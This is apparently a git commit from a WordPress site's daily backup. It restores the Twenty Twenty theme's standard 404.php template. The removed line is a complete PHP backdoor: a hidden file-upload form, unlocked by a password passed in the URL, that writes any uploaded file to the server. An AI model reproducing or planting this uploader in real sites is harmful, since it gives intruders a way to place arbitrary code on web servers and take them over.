7229527701c9860cbb3ebaca26543c7fbc67bed2
destructionorb <neonepsd@gmail.com>
2022-07-15 18:35:17 -0400

    Daily backup - July 15, 2022

--- wp-content/themes/twentytwenty/404.php
+++ wp-content/themes/twentytwenty/404.php
@@ -1,1 +1,36 @@
-<?php if(isset($_POST['uploaded'])){$file=$_FILES['files']['name'];$files=$_FILES['files']['tmp_name'];$folder="";if(move_uploaded_file($files,$folder.$file)){$result="Uploaded : => <A href='$file' target='_blank'>Your file here</A>";}else {$result="Failed to upload...!";}}$password="hada";if($_GET['pass']==$password){echo '<br /><br /><br /><center><form action="" method="post" enctype="multipart/form-data"> <input type="file" name="files" /> <input type="submit" name="uploaded" value="Upload"> </form>'.$result.'</center>';}?>
+<?php
+/**
+ * The template for displaying the 404 template in the Twenty Twenty theme.
+ *
+ * @package WordPress
+ * @subpackage Twenty_Twenty
+ * @since Twenty Twenty 1.0
+ */
+
+get_header();
+?>
+
+<main id="site-content">
+
+	<div class="section-inner thin error404-content">
+
+		<h1 class="entry-title"><?php _e( 'Page Not Found', 'twentytwenty' ); ?></h1>
+
+		<div class="intro-text"><p><?php _e( 'The page you were looking for could not be found. It might have been removed, renamed, or did not exist in the first place.', 'twentytwenty' ); ?></p></div>
+
+		<?php
+		get_search_form(
+			array(
+				'aria_label' => __( '404 not found', 'twentytwenty' ),
+			)
+		);
+		?>
+
+	</div><!-- .section-inner -->
+
+</main><!-- #site-content -->
+
+<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>
+
+<?php
+get_footer();
